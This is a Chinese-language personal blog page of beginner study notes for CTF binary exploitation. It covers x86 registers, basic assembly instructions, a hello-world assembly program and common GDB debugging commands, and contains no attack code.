<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"xiaoxiaoxy1.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="xy对pwn的一点理解">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN笔记">
<meta property="og:url" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="xiaoxiaoxy">
<meta property="og:description" content="xy对pwn的一点理解">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/image-20220316102359067.png">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/image-20220316102609011.png">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/image-20220315222546638.png">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/image-20220315223144227.png">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/image-20220315223426214.png">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/image-20220315222941502.png">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-16492519624892.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-16492519649644.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-16492519668146.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-16492519707248.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925197371610.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925197641012.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925197919214.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925198134116.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925198384318.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925198558120.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925198730622.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925198974124.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925199247626.jpeg">
<meta property="og:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/640-164925199651728.jpeg">
<meta property="article:published_time" content="2022-02-17T08:00:21.000Z">
<meta property="article:modified_time" content="2022-04-10T07:18:32.935Z">
<meta property="article:author" content="xiaoxiaoxy">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/image-20220316102359067.png">


<link rel="canonical" href="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/","path":"2022/02/17/PWN笔记/","title":"PWN笔记"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>PWN笔记 | xiaoxiaoxy</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="xiaoxiaoxy" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">xiaoxiaoxy</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">1.</span> <span class="nav-text">寄存器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#x86%E5%AF%84%E5%AD%98%E5%99%A8-32%E4%BD%8D"><span class="nav-number">1.1.</span> <span class="nav-text">x86寄存器(32位)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x86%E5%AF%84%E5%AD%98%E5%99%A8-64%E4%BD%8D"><span class="nav-number">1.2.</span> <span class="nav-text">x86寄存器(64位)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="nav-number">2.</span> <span class="nav-text">汇编基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%87%E4%BB%A4%E7%AC%A6%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">指令符：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-world"><span class="nav-number">2.2.</span> <span class="nav-text">hello world</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%82"><span class="nav-number">2.3.</span> <span class="nav-text">杂</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dword-ptr-ecx-4"><span class="nav-number">2.4.</span> <span class="nav-text">dword ptr [ecx-4]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#esp"><span class="nav-number">2.5.</span> <span class="nav-text">esp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux%E5%AD%97%E7%AC%A6"><span class="nav-number">3.</span> <span class="nav-text">linux字符</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GDB"><span class="nav-number">4.</span> <span class="nav-text">GDB</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwntools"><span class="nav-number">5.</span> <span class="nav-text">pwntools</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">6.</span> <span class="nav-text">系统调用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ROPgadget%E5%B7%A5%E5%85%B7"><span class="nav-number">7.</span> <span class="nav-text">ROPgadget工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97"><span class="nav-number">8.</span> <span class="nav-text">偏移计算</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">xiaoxiaoxy</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="http://xiaoxiaoxy1.github.io/2022/02/17/PWN%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="xiaoxiaoxy">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xiaoxiaoxy">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          PWN笔记
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-17 16:00:21" itemprop="dateCreated datePublished" datetime="2022-02-17T16:00:21+08:00">2022-02-17</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-04-10 15:18:32" itemprop="dateModified" datetime="2022-04-10T15:18:32+08:00">2022-04-10</time>
      </span>

  
</div>

            <div class="post-description">xy对pwn的一点理解</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><br/>

<h2 id="x86寄存器-32位"><a href="#x86寄存器-32位" class="headerlink" title="x86寄存器(32位)"></a>x86寄存器(32位)</h2><p>学习链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/choufu1408/article/details/100655739">https://blog.csdn.net/choufu1408/article/details/100655739</a></p>
<p>学习链接（荐）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhu2695/article/details/16813425">代码人生。。。-CSDN博客_esi寄存器</a></p>
<p>摘要：</p>
<table>
<thead>
<tr>
<th><strong>寄存器名称</strong></th>
<th><strong>用  途  描  述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>eax</td>
<td>用于操作数和结果数据的累加器</td>
</tr>
<tr>
<td>ebx</td>
<td>指向数据内存段中的数据的指针</td>
</tr>
<tr>
<td>ecx</td>
<td>字符串和循环操作的计数器</td>
</tr>
<tr>
<td>edx</td>
<td>I/O指针</td>
</tr>
<tr>
<td>edi</td>
<td>用于字符串操作的目标的数据指针</td>
</tr>
<tr>
<td>esi</td>
<td>用于字符串操作的源的数据指针</td>
</tr>
<tr>
<td>esp</td>
<td>堆栈指针</td>
</tr>
<tr>
<td>ebp</td>
<td>堆栈数据指针</td>
</tr>
</tbody></table>
<p>个人理解（知道这些差不多了）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ebp:栈底指针      <span class="comment">#中间的b可记为base，基底</span></span><br><span class="line">esb:栈顶指针      <span class="comment">#指向栈的顶部</span></span><br><span class="line">eip:存下一条指令的地址 </span><br><span class="line">其他几个寄存器没有特别限定想存啥都行       <span class="comment">#pwn题暂时了解以上三个就够了</span></span><br></pre></td></tr></table></figure>

<br/>

<h2 id="x86寄存器-64位"><a href="#x86寄存器-64位" class="headerlink" title="x86寄存器(64位)"></a>x86寄存器(64位)</h2><p>个人理解：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rbp:栈底指针      <span class="comment">#64位用r做前缀 </span></span><br><span class="line">rsp:栈顶指针</span><br><span class="line">rip:存下一条指令</span><br><span class="line">RDI, RSI, RDX, RCX, R8 和 R9 寄存器   <span class="comment">#暂时了解这几个就够了</span></span><br><span class="line">注：System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。</span><br></pre></td></tr></table></figure>

<br/>

<br/>

<h1 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h1><p>《CTF竞赛权威指南》P34，此处简记要点供个人随时复习</p>
<h2 id="指令符："><a href="#指令符：" class="headerlink" title="指令符："></a>指令符：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">遇到一个便记录一个：</span><br><span class="line"></span><br><span class="line">数据传送与访问：mov</span><br><span class="line"></span><br><span class="line">算术运算与逻辑运算：</span><br><span class="line">	inc/dec      <span class="comment">#操作数±1</span></span><br><span class="line">	add/sub      <span class="comment">#长度相同的操作数相加减</span></span><br><span class="line">	and/or		 <span class="comment">#按位逻辑与/或</span></span><br><span class="line">	mul          <span class="comment">#乘法操作</span></span><br><span class="line">	xor          <span class="comment">#异或操作，常用做寄存器值置零</span></span><br><span class="line">	neg          <span class="comment">#将操作数转换为二进制补码，并将操作数的符号位取反</span></span><br><span class="line">    </span><br><span class="line">跳转指令与循环指令：</span><br><span class="line">	jmp          <span class="comment">#无条件跳转指令，一般需要使用一个标号来标识，可以实现循环</span></span><br><span class="line">	LOOP         <span class="comment">#循环指令，每循环一次循环计数寄存器减1</span></span><br><span class="line">	je           <span class="comment">#条件跳转，链接：https://blog.csdn.net/ssihc0/article/details/5215044</span></span><br><span class="line">	</span><br><span class="line">栈与函数调用：</span><br><span class="line">	push         <span class="comment">#入栈，详细操作P41</span></span><br><span class="line">	pop          <span class="comment">#从栈中pop一个值，给ebp</span></span><br><span class="line">	</span><br><span class="line">使用栈保存函数返回地址：</span><br><span class="line">	call         <span class="comment">#call调用子函数时，下一条指令的地址作为返回地址存入栈中</span></span><br><span class="line">				 <span class="comment">#https://blog.csdn.net/u013018721/article/details/51264199</span></span><br><span class="line">	ret          <span class="comment">#往栈上高地址一个单位取地址当做跳转地址   *******</span></span><br><span class="line">				 <span class="comment">#链接：https://blog.csdn.net/qq_37340753/article/details/81585083</span></span><br><span class="line">	</span><br><span class="line">其他：</span><br><span class="line">	lea          <span class="comment">#官方解释Load Effective Address，即装入有效地址的意思，它的操作数就是地址</span></span><br><span class="line">	nop          <span class="comment">#空操作，链接：https://www.cnblogs.com/shangzhijian/p/4994028.html</span></span><br><span class="line">	leave        <span class="comment">#mov esp,ebp和pop ebp</span></span><br><span class="line">				 <span class="comment">#链接：https://blog.csdn.net/striver1205/article/details/25216699</span></span><br><span class="line">				 <span class="comment">#链接：https://blog.csdn.net/zhangxinrun/article/details/5888425</span></span><br><span class="line">	int 0x80     <span class="comment">#系统调用</span></span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<br/>

<h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p><strong>P55：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">msg:</span><br><span class="line">	.ascii <span class="string">&quot;hello world!&quot;</span></span><br><span class="line">	len = . - msg</span><br><span class="line">	</span><br><span class="line">.text</span><br><span class="line">	.global _start</span><br><span class="line">	</span><br><span class="line">_start:</span><br><span class="line">	movl <span class="variable">$len</span>, %edx</span><br><span class="line">	movl <span class="variable">$msg</span>, %ecx</span><br><span class="line">	movl <span class="variable">$1</span>, %ebx</span><br><span class="line">	movl <span class="variable">$4</span>, %eax</span><br><span class="line">	int <span class="variable">$0x80</span></span><br><span class="line">	</span><br><span class="line">	movl <span class="variable">$0</span>, %ebx</span><br><span class="line">	movl <span class="variable">$1</span>, %eax</span><br><span class="line">	int <span class="variable">$0x80</span></span><br></pre></td></tr></table></figure>

<p>注（个人理解）：</p>
<p>​    .data表示data段</p>
<p>​    msg：定义字符串”hello world!”</p>
<p>​    len：字符串长度</p>
<p>​    len = . - msg：. 表示当前位置，msg表示字符串前面的一个位置，两者相减便得到了字符串长度</p>
<p>​    int $0x80：转入内核模式，进入内核模式前会根据相关寄存器(eax、ebx)的值进行相应的系统调用，所以在这之前会有两句设置寄存器值的汇编语句。</p>
<p>​    64位中使用syscall指令进入内核模式，32位使用int $0x80。</p>
<br/>

<p>相关链接：</p>
<p>​    链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/czg13548930186/article/details/80818019">.text、.global_start、_start</a></p>
<p>​    链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/snail-micheal/p/4189632.html">https://www.cnblogs.com/snail-micheal/p/4189632.html</a></p>
<br/>

<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p><strong>and  esp, 0FFFFFFF0h</strong></p>
<p>自己写了个程序以供分析，发现了一句不知道用来干嘛的的汇编</p>
<p><img src="image-20220316102359067.png" alt="image-20220316102359067"></p>
<p>经查阅资料：得知该句是用来优化、对齐的。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.qingshanzhi.com/?p=200">and esp,0fffffff0h的作用 – 青山志 (qingshanzhi.com)</a></p>
<p>防止博主删博客，留图如下：</p>
<p><img src="image-20220316102609011.png" alt="image-20220316102609011"></p>
<br/>

<p><strong>x86_get_pc_thunk_ax</strong></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_55708805/article/details/117827490">＜__x86.get_pc_thunk.ax＞有什么作用?_Freestyle Coding的博客-CSDN博客</a></p>
<br/>

<p><strong>call/retn/leave</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">call:相当于将下一条指令地址入栈，然后jmp到后面那个函数处执行</span><br><span class="line">    (1)段内转移的CALL指令等价于两条指令：</span><br><span class="line">      push eip</span><br><span class="line">      jmp   目的位置</span><br><span class="line">      也就是说，执行段内转移的CALL指令时，相当于先后执行以上两条指令。</span><br><span class="line">      (2)段间转移的CALL指令等价于三条指令：</span><br><span class="line">      push CS</span><br><span class="line">      push eip</span><br><span class="line">      jmp   目的位置</span><br><span class="line"> </span><br><span class="line">retn:</span><br><span class="line">	RETN等价于一条指令：POP   eip</span><br><span class="line">　　	 RETF等价于两条指令：</span><br><span class="line">　	　POP   eip</span><br><span class="line">　　	 POP   CS</span><br><span class="line">　　 </span><br><span class="line">　　 而带有操作数的RETN/RETF指令则是在POP（ESP+4）之后，执行ESP=ESP+操作数1。</span><br><span class="line">		eip = [esp]</span><br><span class="line">		esp = esp + 4 //将esp中的数据出栈到eip中,同时ESP+4</span><br><span class="line">　　	 </span><br><span class="line">leave:</span><br><span class="line">	  mov esp,ebp</span><br><span class="line">	  pop ebp //还原函数栈</span><br></pre></td></tr></table></figure>

<br/>

<h2 id="dword-ptr-ecx-4"><a href="#dword-ptr-ecx-4" class="headerlink" title="dword ptr [ecx-4]"></a>dword ptr [ecx-4]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">[]里的数据是一个地址值，这个地址指向一个双字型数据</span><br><span class="line">比如mov eax, dword ptr [12345678]  把内存地址12345678中的双字型（32位）数据赋给eax</span><br></pre></td></tr></table></figure>



<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/kaiwii/article/details/7385929"> 关于dword ptr 指令的意思_Kaiwii的博客-CSDN博客_ptr指令</a></p>
<br/>

<h2 id="esp"><a href="#esp" class="headerlink" title="esp"></a>esp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    <span class="comment">#先减esp，再压入</span></span><br><span class="line">pop     <span class="comment">#先取数据再增esp</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>相关链接：</p>
<p>push/pop：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cherisegege/article/details/79834390">8086汇编基础 push,pop指令执行时，sp怎么变_cherisegege的博客-CSDN博客_pop指令过后sp怎么变</a></p>
<p>retn/call/leave：<a target="_blank" rel="noopener" href="https://blog.csdn.net/comeonow/article/details/81355924">执行retn、call、leave指令的时候，esp和eip的变化情况_comeonow的博客-CSDN博客</a></p>
<br/>

<br/>

<h1 id="linux字符"><a href="#linux字符" class="headerlink" title="linux字符"></a>linux字符</h1><p>链接：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/96272363">Linux通配符讲解 - 知乎 (zhihu.com)</a></p>
<h1 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">n   		 <span class="comment">#执行一行源代码但不进入函数内部</span></span><br><span class="line"></span><br><span class="line">ni   		 <span class="comment">#执行一行汇编代码但不进入函数内部</span></span><br><span class="line"></span><br><span class="line">s   		 <span class="comment">#执行一行源代码而且进入函数内部</span></span><br><span class="line"></span><br><span class="line">si   		 <span class="comment">#执行一行汇编代码而且进入函数内部</span></span><br><span class="line"></span><br><span class="line">c            <span class="comment">#继续执行到下一个断点</span></span><br><span class="line"></span><br><span class="line">b *&lt;地址&gt;    <span class="comment">#下断点</span></span><br><span class="line"></span><br><span class="line">stack       <span class="comment">#显示栈信息</span></span><br><span class="line"></span><br><span class="line">finish      <span class="comment">#结束当前运行函数</span></span><br><span class="line"></span><br><span class="line">x           <span class="comment">#按十六进制格式显示内存数据，其中x/&#123;字节数&#125;x 以16进制显示指定地址处的数据;</span></span><br><span class="line">            <span class="comment">#&#123;字节数&#125;表示字节数制定（b 单字节；h 双字节；w 四字节；g 八字节；默认为四字节）</span></span><br><span class="line"></span><br><span class="line">disas/disassemble (函数名)      <span class="comment">#将函数整个流程的汇编显示出来。</span></span><br><span class="line"></span><br><span class="line">i           <span class="comment">#info，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用</span></span><br><span class="line"></span><br><span class="line">i b         <span class="comment">#info break 查看所有断点信息（编号、断点位置）</span></span><br><span class="line">i r         <span class="comment">#info registers 查看各个寄存器当前的值</span></span><br><span class="line">i f         <span class="comment">#info function 查看所有函数名，需保留符号</span></span><br><span class="line"></span><br><span class="line">vmmap       <span class="comment">#查看当前程序映射的内存块</span></span><br></pre></td></tr></table></figure>

<p> <strong>查看内存指令x：</strong></p>
<ul>
<li><code>x /nuf 0x123456</code> //常用，x指令的格式是：<code>x/nfu</code>，<code>nfu</code>代表三个参数</li>
<li>n代表<strong>显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节）</strong>，放在’/‘后面</li>
<li>u代表一个单元几个字节，b(一个字节)，h(俩字节)，w(四字节)，g(八字节)</li>
<li>f代表显示数据的格式，<strong>f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x 	按十六进制格式显示变量。</span><br><span class="line">d 	按十进制格式显示变量。</span><br><span class="line">u 	按十六进制格式显示无符号整型。</span><br><span class="line">o 	按八进制格式显示变量。</span><br><span class="line">t 	按二进制格式显示变量。</span><br><span class="line">a 	按十六进制格式显示变量。</span><br><span class="line">c 	按字符格式显示变量。</span><br><span class="line">f 	按浮点数格式显示变量。</span><br><span class="line">s 	按字符串显示。</span><br><span class="line">b	按字符显示。</span><br><span class="line">i	显示汇编指令。</span><br></pre></td></tr></table></figure>

<ul>
<li>x /10gx 0x123456 //<strong>常用</strong>，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</li>
<li>x /10xd $rdi //从<strong>rdi指向的地址向后</strong>打印10个单元，每个单元4字节的十进制数</li>
<li>x /10i 0x123456 //<strong>常用</strong>，从0x123456处向后显示十条汇编指令</li>
</ul>
<p>例：$ x/136wx 0x7fffffffdf08</p>
<br/>

<p>链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30697239/article/details/101103647">https://blog.csdn.net/weixin_30697239/article/details/101103647</a></p>
<br/>

<br/>

